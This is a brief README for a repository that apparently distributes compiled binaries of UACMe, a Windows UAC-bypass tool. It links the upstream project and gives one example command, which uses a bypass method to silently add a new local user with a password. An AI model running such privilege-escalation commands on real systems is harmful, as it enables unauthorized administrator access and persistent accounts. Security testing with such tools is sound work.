# UACME-bin
Compiled UACMe, a tool for bypassing Windows UAC.

Reference:
- https://github.com/hfiref0x/UACME

Command example:
```powershell
Akagi64.exe 61 "net user asuka asuk@1337 /add"
```

![Akagi Add User](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw_-d4vLRrPx3Xj4loU240qW6gvsxJV8L808DiN6bA3qdYR3VcYCjgsAZeapMRoEOjBO8XnbTJb_ZvuUhacESa9uGTzMuDMknMTGHrCEciomluD-eBAjVaPwmd-AwSeFLfRRCey4Uqjyni5KBarmLR1BWxBrXGPq1z0ws3cwLocv16W2BwVv02lILedGnh/s850/uac-bypass.png)
## Disclaimer

Any actions and or activities related to the material contained within this tool is solely your responsibility.The misuse of the information in this tool can result in criminal charges brought against the persons in question.
